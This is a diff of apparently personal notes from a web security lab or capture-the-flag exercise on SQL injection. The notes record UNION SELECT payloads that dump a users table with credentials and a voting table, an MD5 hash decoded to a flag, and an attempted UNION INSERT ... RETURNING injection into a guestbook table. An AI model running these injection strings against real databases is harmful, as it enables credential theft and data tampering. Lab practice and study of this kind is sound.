@@ -55,15 +55,6 @@ since we have to return 2 fields for the union to work we use 2 union in the
 	UNION SELECT user_id, countersign FROM users--
 >> dumps all the users table data because why the fuck not(see dump_04*)
 
-
-
-
-!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!
-TODO decrypt pw ! user 5
-!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!
-
 	(flag ?)
 	5ff9d0165b4f92b14994e5c685cdce28
 	(md5 decode) -> FortyTwo
@@ -107,6 +98,48 @@ TODO check for shady shit
 	UNION SELECT id_vote, nb_vote FROM Member_survey.vote_dbs
 	UNION SELECT id_vote, subject FROM Member_survey.vote_dbs--
 >> dump_08*
+
+
+
+
+
+
+
+
+
+
+
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+
+    insert into Scholars (firstname, lastname, address, phone, email)
+      values ('Henry', 'Higgins', '27A Wimpole Street', '3231212', null)
+      returning lastname, fullname, id
+
+    insert into Dumbbells (firstname, lastname, iq)
+      select fname, lname, iq from Friends order by iq rows 1
+      returning id, firstname, iq into :id, :fname, :iq;
+
+
+
+UNION INSERT RETURNING
+################################################################################
+9 UNION INSERT INTO Member_guestbook.guestbook (name, comment) VALUES ('kpz', 'yesyesyesyes') RETURNING name, comment--
+
+
+
+
+
+
+
+
+
+
 
 
 
